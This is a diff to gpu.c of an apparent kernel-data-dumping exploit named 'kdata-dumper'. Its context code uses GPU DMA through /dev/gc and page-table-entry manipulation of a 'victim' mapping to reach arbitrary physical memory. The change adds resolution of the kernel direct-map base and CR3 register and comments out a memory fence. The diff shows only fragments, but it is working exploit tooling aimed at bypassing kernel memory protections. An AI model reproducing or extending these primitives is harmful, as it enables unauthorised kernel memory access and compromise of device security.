@@ -1,9 +1,7 @@
 /*
  * kdata-dumper: gpu.c
  */
-#pragma once
 
-#include <main.h>
 #include <gpu.h>
 
 static int gc_fd = -1;
@@ -11,6 +9,8 @@ static u64 victim_va  = 0;
 static u64 transfer_va = 0;
 static u64 victim_ptbe_va = 0;
 static u64 cleared_ptbe_for_ro = 0;
+static u64 g_dmap_base = 0;
+static u64 g_kernel_cr3 = 0;
 
 static u64 resolve_dmap_and_cr3(u64 *cr3_out) {
     // pmap_store is at data_base + FW-specific offset
@@ -150,7 +150,7 @@ static void gpu_submit_dma(u64 dst_va, u64 src_va, u32 size_bytes) {
 
     // Write PM4 into cmd_va (reuse transfer_va + offset for cmd buf)
     u64 cmd_va = transfer_va + GPU_DMA_SIZE - 0x1000;
-    kernel_copyout(0, NULL, 0); // fence — ensure prior writes visible
+    //__asm__ volatile("" ::: "memory");
     for (int i = 0; i < 7; i++) {
         u32 v = pm4[i];
         // write pm4 dword into cmd_va via mapped memory
@@ -194,6 +194,13 @@ static void gpu_remap_victim(u64 target_phys) {
 int gpu_dma_setup(u64 curproc, u64 proc_vmspace_off) {
     gc_fd = open("/dev/gc", O_RDWR);
     if (gc_fd < 0) { NOTIFY("gpu: open /dev/gc failed"); return -1; }
+
+    g_dmap_base = resolve_dmap_and_cr3(&g_kernel_cr3);
+    if (!g_dmap_base || !g_kernel_cr3) {
+        NOTIFY("gpu: failed to resolve dmap/cr3");
+        return -1;
+    }
+    NOTIFY("gpu: dmap_base=0x%llx cr3=0x%llx", g_dmap_base, g_kernel_cr3);
 
     // Allocate 2x 2MB direct memory regions
     u64 victim_phys = 0, transfer_phys = 0;
